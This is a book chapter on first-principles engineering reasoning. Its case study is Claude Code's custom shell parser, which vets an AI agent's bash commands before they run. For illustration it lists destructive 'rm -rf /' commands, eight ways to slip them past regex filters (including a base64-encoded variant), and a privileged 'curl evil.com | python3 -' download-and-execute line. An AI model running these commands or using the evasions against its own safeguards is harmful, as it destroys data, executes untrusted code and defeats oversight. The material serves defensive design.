Chapter 3: First Principles Reasoning

The Most Dangerous Words in Engineering

"We've always done it this way."

Six words that have produced more bad architecture than any technical limitation. Analogy-driven reasoning -- "Netflix uses microservices, so we should too" -- is the default mode of engineering decision-making, and it is almost always wrong. Not because the analogy is wrong, but because the constraints are different.

First principles reasoning strips a problem to its irreducible physical and logical constraints, then builds upward from those constraints. It asks: What must be true regardless of convention? The answer is usually surprising, because conventions accumulate decades of context that may no longer apply. When you reason from first principles, you discover that the "obvious" solution is obvious only because everyone copied it from someone who copied it from someone who solved a different problem.

This chapter teaches first principles reasoning through the lens of real engineering decisions in Claude Code -- a 500K-line production AI CLI agent. The centerpiece: why the team built a 4,400-line shell parser from scratch instead of using regex, and why that decision was not merely correct but inevitable once the problem was stated in first principles terms.

Why Analogies Mislead

Analogy-driven reasoning follows a template:

  1. System X has a similar problem to ours
  2. System X solved it with approach A
  3. Therefore, we should use approach A

The flaw is in step 1. "Similar" does an enormous amount of unexamined work. Two problems can look similar on the surface while differing in the constraints that actually drive the design.

The Microservices Analogy

Consider a team building a CLI tool. They observe that Netflix, Amazon, and Uber all use microservices. Their CLI tool has a "server component" (a daemon that manages state) and a "client component" (the user-facing CLI). The analogy suggests: split them into microservices.

First principles analysis asks different questions:

  • How many users does each instance serve? Netflix serves millions of concurrent users. A CLI tool serves one. The scaling constraint that justifies microservices does not exist.
  • Do components need independent deployment? Netflix has hundreds of teams deploying independently. A CLI tool has one team and ships one binary. The organizational constraint does not exist.
  • What is the cost of a network hop? For Netflix, inter-service calls happen within a datacenter at sub-millisecond latency. For a CLI tool, the "network hop" is localhost IPC -- but it still adds serialization overhead, connection management, error handling for disconnects, and debugging complexity. The cost is not zero.

Claude Code faced exactly this decision. The team chose a monolithic binary -- not because they were unaware of microservices, but because every first-principles constraint pointed away from them:

Constraint Microservice Implication CLI Reality
Concurrent users Independent scaling needed One user, one process
Team deployment Teams deploy independently One team, atomic releases
Fault isolation Crashed service doesn't affect others One process -- crash means restart
Technology diversity Different services in different languages One language, shared types
Startup time Client starts fast, daemon already running One binary must start in 400ms

The monolith was not the "default" or "lazy" choice. It was the derived choice -- the one that falls out when you strip away every constraint that justifies the alternative.

The Danger of Cargo Culting

Analogy-driven reasoning is dangerous precisely because it feels rigorous. "Google does X" sounds like evidence. But Google has constraints you don't have: millions of engineers, petabytes of data, regulatory requirements across dozens of jurisdictions, hardware they designed themselves. Borrowing their solution without borrowing their constraints is cargo culting -- building the form without understanding the function.

First principles reasoning is harder. It requires you to enumerate your actual constraints, not the constraints you wish you had. It forces uncomfortable admissions: "We have one user." "We have one team." "We don't need to scale." These admissions feel like limitations, but they are actually liberations. Every constraint you don't have is a constraint you don't need to engineer for.

The Five Whys Applied to Architecture

Toyota's "Five Whys" technique is a first principles tool disguised as a quality practice. Each "why?" strips away a layer of assumption until you reach the irreducible constraint.

Example: Why Build a Shell Parser?

Claude Code needs to execute shell commands on behalf of an AI model. The model generates bash commands; the system must evaluate whether each command is safe before executing it. The question: how do you determine if a shell command is safe?

Why 1: Why not just use a blocklist? Because blocklists are incomplete. You can block rm -rf /, but the attacker writes r\m -rf / (backslash escape), 'r'"m" -rf / (quote splitting), or $(echo rm) -rf / (command substitution). The set of dangerous commands is unbounded; the set of evasion techniques is creative.

Why 2: Why not use regex? Because regex matches syntax, not semantics. The command echo "rm -rf /" is safe -- it prints a string. The command rm -rf / is destructive. Regex cannot distinguish between "contains the characters rm -rf /" and "executes rm -rf /." The fundamental problem is that regex operates on the textual surface, not on the command's execution structure.

Why 3: Why does the execution structure matter? Because shell syntax is a language with quoting rules, escape sequences, pipes, subshells, command substitution, heredocs, and operator precedence. The meaning of a character depends on its syntactic context. A | inside single quotes is a literal character. A | outside quotes is a pipe operator. The same bytes mean different things depending on context. Only a parser can track that context.

Why 4: Why not use an existing parser? Because existing shell parsers are designed for execution, not for security analysis. Bash's own parser evaluates commands as it parses them -- it doesn't produce an AST you can inspect before execution. Tree-sitter provides syntax trees, but it's an external dependency that adds attack surface and may not handle all shell dialects. ShellCheck is a linter, not a security classifier. Each existing tool solves an adjacent problem, not the actual problem.

Why 5: Why is the actual problem different? Because the actual problem is: given a command string, determine what programs it will execute, with what arguments, in what order, with what I/O redirections, before running it. This requires a parser that: - Resolves all quoting and escaping to produce normalized tokens - Builds an AST that represents the execution structure - Recursively analyzes command substitutions and nested shells - Classifies each command by its semantic behavior (read-only, write, destructive, network)

No existing tool does all four. The first principles analysis terminates at: you can't secure what you can't parse. You must build a parser.

The Five Whys didn't produce the answer directly. They eliminated every alternative until only one answer remained. This is how first principles reasoning works: it is a process of elimination driven by constraints, not a flash of insight.

Reasoning from Physics, Not Convention

Elon Musk popularized the phrase "reasoning from first principles rather than by analogy." The physics framing is useful: in physics, first principles are the fundamental laws (conservation of energy, speed of light, thermodynamics) that constrain all solutions. In engineering, the equivalent is the set of constraints that cannot be negotiated away.

Identifying Your Physics

Every engineering problem has its own "physics" -- constraints that are as immovable as the speed of light within the problem's domain. The discipline is identifying them.

Performance physics. Human perception research shows that delays under 100ms feel instantaneous, 100-400ms feel responsive, and over 1 second feels slow. This is not a convention -- it is a property of the human nervous system. When Claude Code set a 400ms startup budget, they were reasoning from the physics of human perception, not from the convention of "CLI tools should be fast."

Security physics. An attacker only needs to find one vulnerability. A defender must close all of them. This asymmetry is a physical property of security -- it cannot be eliminated by better tools or processes, only managed through defense in depth. When Claude Code built nine layers of security for its Bash tool (parse, classify, pattern check, permission rules, AI classifier, sandbox, and more), they were reasoning from the physics of defender asymmetry.

Complexity physics. Fred Brooks's distinction between essential and accidental complexity is a first principle. Essential complexity is inherent to the problem; accidental complexity is introduced by the solution. A shell parser must handle every quoting rule -- that is essential complexity. If the parser also had a plugin system nobody uses, that would be accidental complexity. The physics says: you can eliminate accidental complexity, but essential complexity is irreducible. Fighting it wastes energy.

The Cost Model as Physics

Every system has a dominant cost model that shapes its architecture. For Claude Code, the dominant cost is API prompt caching:

  • A prompt cache hit costs approximately $0.03 per 70K-token system prompt
  • A prompt cache miss costs approximately $0.20 per 70K-token system prompt
  • The ratio: a miss costs roughly 7x a hit

This cost model is as constraining as a physical law. Any architectural change that causes unnecessary cache misses has a direct, measurable financial impact. The team designed cache latching -- boolean fields that never revert once set -- because the physics of their cost model demanded stable cache keys. This is not a "best practice." It is a direct consequence of the cost function.

Applying the Method

To reason from physics in your own system:

  1. List every constraint that cannot be negotiated. Response time requirements, regulatory mandates, hardware limits, user count, team size, deployment model. These are your physics.
  2. For each "best practice" you're tempted to apply, ask: which of my constraints does this address? If none, it is cargo culting. If one, it is justified. If multiple, it is a strong choice.
  3. When the derived answer contradicts convention, trust the derivation. Global mutable state is "bad practice." But for a single-process, single-user CLI agent with deep call stacks, global state derived from constraints is simpler than dependency injection derived from convention. The constraints win.

Case Study: The Shell Parser

Let us now trace the full first principles derivation of Claude Code's shell parser -- a 4,400-line module that is one of the most security-critical components in the system.

The Problem Statement

An AI model generates shell commands. Before executing each command, the system must determine: 1. What programs will be executed 2. With what arguments 3. In what order 4. With what I/O redirections 5. Whether any step is destructive, exfiltrates data, or escalates privileges

This determination must happen before execution, must be resistant to evasion, and must handle the full complexity of bash syntax.

The Naive Approach: Regex

The first instinct is pattern matching. Build a list of dangerous patterns and check each command against them:

const DANGEROUS_PATTERNS = [
  /\brm\s+-rf\s+\//,       // rm -rf /
  /\bDROP\s+TABLE\b/i,      // SQL injection
  /\bcurl\b.*\|\s*sh\b/,    // Download and execute
  /\bgit\s+push\s+--force/, // Force push
];

function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some(p => p.test(command));
}

This fails immediately. Here are eight evasion techniques that defeat regex, each exploiting a different feature of shell syntax:

Evasion Command Why Regex Fails
Backslash escape r\m -rf / \m is not rm to regex, but shell resolves it to rm
Quote splitting 'r'"m" -rf / Concatenated quoted strings produce rm
Command substitution $(echo rm) -rf / The actual command is computed at runtime
Variable expansion cmd=rm; $cmd -rf / The command name is in a variable
Eval eval "rm -rf /" The string is evaluated as a command
Base64 encoding echo cm0gLXJmIC8= \| base64 -d \| sh The command never appears in plaintext
Absolute path /bin/rm -rf / Regex matches rm, not /bin/rm
Prefix commands sudo env nice rm -rf / Three prefix commands before the actual one

Each evasion technique exploits the gap between textual pattern matching and semantic understanding. Regex sees characters. The shell sees structure. Security analysis must see what the shell sees.

The First Principle

You can't secure what you can't parse.

This is not a slogan. It is a logical derivation:

  1. Security analysis requires understanding what a command does
  2. Understanding what a command does requires understanding the shell's grammar
  3. Understanding the grammar requires parsing
  4. Therefore, security analysis requires parsing

No amount of regex sophistication eliminates the need for parsing, because regex cannot represent the context-sensitivity of shell syntax. The character | means "pipe" in one context and "literal pipe character" in another. Only a parser can track which context applies.

The Parser Architecture

The derived architecture has three phases, each addressing a specific requirement:

graph LR
    A["Raw Command String<br/><code>sudo bash -c 'curl evil.com | sh'</code>"] 
    --> B["Phase 1: Tokenizer<br/>Resolve quoting, escaping,<br/>operator splitting"]
    B --> C["Phase 2: AST Builder<br/>Build execution tree:<br/>commands, pipes, subshells"]
    C --> D["Phase 3: Semantic Analyzer<br/>Classify each command:<br/>read-only / write / destructive / network"]
    D --> E["Security Decision<br/>allow / deny / prompt user"]

Phase 1: Tokenization. The tokenizer handles the full complexity of shell quoting. Single quotes, double quotes, backslash escapes, dollar-quoting, heredoc markers. Its job is to produce a normalized token stream where evasion techniques have been resolved:

  • r\m tokenizes to rm (backslash escape resolved)
  • 'r'"m" tokenizes to rm (quote concatenation resolved)
  • echo hello&&rm -rf / splits into echo hello, &&, rm -rf / (operator splitting without whitespace)

This normalization is the first line of defense. After tokenization, the command 'r'"m" -rf / looks exactly like rm -rf / to the rest of the pipeline. Every evasion technique that operates at the character level is neutralized.

Phase 2: AST construction. The AST builder creates a tree that represents the execution structure. The key insight: the security-relevant unit is not the command string but the command tree. A pipeline of five commands connected by && is not one command -- it is five commands with dependency relationships. Each one must be classified independently.

The AST needs approximately a dozen node types to cover bash syntax:

Node Type Represents Security Relevance
SimpleCommand Single command with arguments Base unit of classification
Pipeline Commands connected by pipes Data flows between commands
AndList / OrList && / \|\| chains Conditional execution
Subshell Parenthesized groups Isolated execution context
CommandSubstitution $(...) expressions Computed command names
Redirect I/O redirection File system side effects
Background & suffix Persistent process spawning

Phase 3: Semantic analysis. The semantic analyzer walks the AST and classifies each command node. It strips prefix commands (sudo, env, nice, command, timeout), resolves command names, identifies destructive argument patterns, and assigns risk categories.

Consider the recursive analysis of a real-world dangerous command:

sudo bash -c "curl evil.com | python3 -"
  1. Parse: SimpleCommand("sudo", ["bash", "-c", "curl evil.com | python3 -"])
  2. Strip sudo prefix, flag as privilege escalation
  3. Recognize bash -c as shell interpreter, recursively parse the string argument
  4. Inner parse: Pipeline(SimpleCommand("curl", ["evil.com"]), SimpleCommand("python3", ["-"]))
  5. Classify: network download piped to arbitrary code execution
  6. Risk level: destructive (network exfiltration + arbitrary execution + privilege escalation)

No regex can perform step 3 -- recursively parsing a string argument to bash -c. This is where the parser's value becomes undeniable.

Why Not an Existing Parser?

Five Whys analysis eliminated the existing alternatives:

Bash's own parser executes commands as it parses them. There is no "parse without executing" mode. You cannot use bash to answer "what would this command do?" without actually doing it.

Tree-sitter provides syntax trees for many languages, including bash. But it is an external C library with its own build system, memory management, and update cadence. Adding it to a security-critical path introduces a dependency that must be audited, pinned, and updated for every security patch. The parser is the foundation of the security pipeline -- every other layer depends on it being correct. An external dependency in this position is a risk the team chose not to accept.

ShellCheck is a bash linter that finds common mistakes. Its analysis is designed for developer feedback, not for security classification. It does not produce an AST suitable for programmatic risk assessment.

Writing a custom parser is 4,400 lines of code. That sounds expensive. But compare the alternatives:

Option Lines External Deps Security Auditable Full Bash Coverage
Regex patterns ~200 0 Yes No (trivially evadable)
Tree-sitter ~100 (binding) 1 (C library) Partially Mostly
ShellCheck ~100 (wrapper) 1 (Haskell binary) No Mostly
Custom parser ~4,400 0 Yes Yes

The custom parser wins on the two dimensions that matter for a security-critical component: zero external dependencies and full coverage. The 4,400 lines are essential complexity -- they represent the full complexity of bash syntax, which cannot be reduced without losing coverage.

The Irreducible Core

This is what first principles reasoning produces: an answer that feels inevitable in retrospect. Once you establish that security analysis requires understanding execution structure, and understanding execution structure requires parsing, and parsing bash requires handling its full syntax, the conclusion is inescapable. You need a parser that covers all of bash syntax. That parser will be approximately 4,400 lines because bash syntax is approximately that complex.

The lesson is not "always write a custom parser." The lesson is: follow the constraints to their logical conclusion, even when the conclusion is more work than you expected. A 200-line regex solution is tempting because it is fast to build. But it fails the first constraint -- resistance to evasion -- and no amount of refinement can fix that, because regex fundamentally cannot parse context-sensitive grammars.

First Principles in System Design

The shell parser is a dramatic example, but first principles reasoning applies to every design decision. Here is a framework for applying it systematically.

Step 1: State the Problem Without a Solution

Most problem statements contain embedded solutions. "We need a microservices architecture" is a solution, not a problem. "We need independent deployment of the authentication service" is closer to a problem, but still assumes services and deployment as concepts.

A first-principles problem statement describes the constraint without prescribing the mechanism:

  • Bad: "We need a caching layer for API responses"
  • Better: "Repeated API calls with identical parameters cost $0.20 each and take 200ms; we need to eliminate that cost and latency for duplicate requests"
  • Best: "Our cost model is dominated by API calls at $0.20/call, with 40% of calls being duplicates. Our latency budget for user-facing responses is 400ms."

The best version contains only constraints -- cost, latency, duplication rate. It does not mention caching, which is a solution. The solution might be caching, or it might be prompt rewriting to reduce duplication, or it might be batching, or it might be a cheaper API tier. First principles reasoning keeps all options open until the constraints eliminate them.

Step 2: Enumerate the Constraints

Constraints come in several categories:

Hard constraints cannot be violated. The speed of light. The network latency between continents. The API's rate limit. The user's expectation of sub-second response time.

Soft constraints can be violated at a cost. File size limits (larger files work but slow down). Memory budgets (exceeding them causes swap, not failure). Code complexity thresholds (complex code works but is harder to maintain).

Assumed constraints feel real but may not be. "We must use PostgreSQL" (because we always have). "The API must be RESTful" (because the last one was). "We need Kubernetes" (because everyone uses it). These are the most dangerous because they feel as solid as hard constraints but evaporate under questioning.

The discipline is to test every constraint: If I remove this constraint, does my problem change? If yes, it is a real constraint. If no, it is an assumption.

Step 3: Derive the Architecture

With a clean problem statement and a verified set of constraints, the architecture often derives itself. Each constraint eliminates options until the solution space is small.

Claude Code's global state decision is a textbook example:

Constraint Effect on Design
Single process, single user No concurrency -- DI's isolation benefit does not apply
15+ deep call stacks DI requires context parameter in every function signature
Cross-cutting telemetry "Singleton-scoped DI" is just global state with abstraction overhead
400ms startup budget DI containers add initialization time

Four constraints, four points against dependency injection, zero points for it. The derivation produces global mutable state -- a "bad practice" that is correct for these specific constraints.

Step 4: Verify Against Convention

After deriving an answer, compare it to conventional wisdom. If they agree, great. If they disagree, you have found one of two things:

  1. A genuine insight -- your constraints differ from the constraints that produced the convention. Document why.
  2. A mistake in your reasoning -- you missed a constraint or mischaracterized one. Go back to Step 2.

The team documented their global state decision with three escalating warnings in the source code: "DO NOT ADD MORE STATE HERE -- BE JUDICIOUS WITH GLOBAL STATE," "THINK THRICE BEFORE MODIFYING," "AND ESPECIALLY HERE." These warnings acknowledge the convention while defending the derivation. They communicate to future engineers: yes, we know this looks wrong. Here is why it is right for this system. Think before you "fix" it.

Common Traps

First principles reasoning has its own failure modes. Being aware of them makes the technique more reliable.

Trap 1: Premature Reduction

Stripping too many layers too fast. "Why do we need authentication? Because users need access control. Why do users need access control? Because we have multiple users. Do we have multiple users? No, we have one user. Therefore, we don't need authentication."

The error is skipping a constraint: even a single-user system may need authentication to prevent unauthorized access from other processes, network attackers, or untrusted code. First principles reasoning requires patience -- each reduction step must be verified against all constraints, not just the most obvious one.

Trap 2: False Irreducibility

Declaring something a "first principle" when it is actually an assumption. "JavaScript is single-threaded" is a first principle of the V8 runtime. "We must use JavaScript" is an assumption. If you derive architecture from the assumption that JavaScript is a given, you may miss designs that would be better in a different runtime.

Claude Code chose Bun over Node.js partly for its compile-time feature flag system via bun:bundle. If they had treated "Node.js" as a first principle rather than an assumption, they would have missed this option.

Trap 3: Analysis Paralysis

First principles reasoning can be recursive -- every constraint can be questioned further. At some point, you must accept a constraint and move forward. The practical heuristic: stop reducing when you reach a constraint that is outside your control. The speed of light, the API's pricing model, the user's perceptual latency threshold -- these are not your constraints to change. Build from them.

Trap 4: Ignoring Implementation Cost

First principles may derive the "correct" solution, but the correct solution may be prohibitively expensive to implement. A 4,400-line custom parser is justified for a security-critical component in a 500K-line system. The same parser would be absurd in a weekend hackathon project.

The resolution: first principles tell you the ceiling of what is correct. Pragmatism tells you the floor of what is sufficient. If your system is low-risk and short-lived, regex may be sufficient even though a parser is correct. If your system is security-critical and long-lived, nothing less than a parser will do.

The Engineer's First Principles Toolkit

Three mental tools for first principles reasoning, refined through practice:

Tool 1: The Constraint Inversion Test

For every design choice, ask: "What would have to be true for the opposite choice to be correct?" If you chose a monolith, what constraints would need to change for microservices to be the right answer? (Multiple teams deploying independently. Different scaling requirements per component. Different technology stacks.) If those constraints exist, reconsider your choice. If they don't, your derivation is sound.

Tool 2: The Physics Test

For every constraint, ask: "Is this a law of physics or a law of convention?" Laws of physics cannot be worked around. Laws of convention can be changed. The speed of light is physics. "All APIs must be REST" is convention. "Users expect sub-second response times" is physics (it derives from the nervous system). "We must use JSON for API responses" is convention.

Tool 3: The Reductio Test

Take your solution and assume it is wrong. What breaks? If you assume the shell parser is unnecessary and use regex instead, what breaks? Answer: the first attacker who uses backslash escaping bypasses your security. If you assume global state is wrong and use DI instead, what breaks? Answer: nothing breaks, but you add 1,300 lines of context-passing boilerplate. The severity of what breaks tells you how strong your derivation is.

Key Principles

  1. Analogy is not evidence. Netflix's architecture solves Netflix's constraints. Your architecture must solve yours.
  2. Identify your physics. Every problem has immovable constraints -- human perception, security asymmetry, essential complexity, cost models. Find them before designing.
  3. The Five Whys eliminate alternatives. Keep asking "why not?" until only one answer remains.
  4. You can't secure what you can't parse. Any security analysis of structured input requires understanding the input's grammar. Regex is not understanding.
  5. When derivation contradicts convention, document why. Future engineers need to see the reasoning, not just the result.
  6. The correct solution may be more work than expected. First principles don't care about your timeline. They care about what must be true.

Think About It

Exercise 1: Invert Your Last Decision. Pick a recent architectural decision you made. Apply the Constraint Inversion Test: what would have to be true for the opposite choice to be correct? How many of those conditions actually apply? Did you choose by derivation or by convention?

Exercise 2: Find the Physics. Take a system you work on. List every constraint you can think of. Now classify each as physics (immovable) or convention (negotiable). How many "physics" constraints survive scrutiny? Which "conventions" are you treating as physics?

Exercise 3: Five Whys on Your Security Model. Pick a security mechanism in your system (authentication, authorization, input validation, encryption). Apply the Five Whys. Does the mechanism derive from the actual threat model, or from the convention of "we should have security"? What specific attacks does it prevent? What attacks does it miss?

Exercise 4: The Parser Question. Your system processes user input in some structured format -- SQL queries, URLs, file paths, configuration files, command-line arguments. Are you parsing that input or pattern-matching it? If pattern-matching, construct three evasion techniques that bypass your patterns. How hard was that? What does that tell you about your security posture?

Exercise 5: Essential vs. Accidental. Find the largest file in your codebase. Is its size essential (the problem is inherently that complex) or accidental (poor factoring, unnecessary abstractions, dead code)? Apply the heuristic from this chapter: can you draw a line through the file such that code above never calls code below? If yes, split there. If no, the size may be justified.
